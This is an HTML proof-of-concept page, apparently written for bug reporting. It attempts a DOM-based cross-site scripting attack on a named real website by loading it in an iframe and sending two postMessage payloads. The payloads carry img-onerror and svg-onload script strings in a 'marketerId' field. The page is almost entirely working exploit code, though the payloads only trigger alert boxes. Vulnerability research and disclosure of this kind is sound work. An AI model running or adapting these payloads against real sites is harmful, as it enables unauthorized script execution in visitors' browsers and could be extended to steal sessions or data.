<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🔥 Remote XSS PoC</title>
</head>
<body>
  <h1>✅ PoC: DOM XSS via postMessage</h1>
  <p>Tested against: <code>https://thebrowser.company</code></p>
  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:1px solid #aaa;"></iframe>

  <script>
    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("✅ iframe loaded");

      const payloads = [
        {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: ["<img src=x onerror=alert(document.domain)>"]
          }
        },
        {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: ["<svg/onload=alert(document.domain)>"]
          }
        }
      ];

      console.log("🚀 Sending fuzzed postMessage payloads...");
      payloads.forEach((p, i) => {
        console.log(`🔁 Sending payload #${i + 1}:`, p);
        // ✅ آمن: فقط إرسال postMessage
        iframe.contentWindow.postMessage(p, "*");
      });
    };
  </script>
</body>
</html>
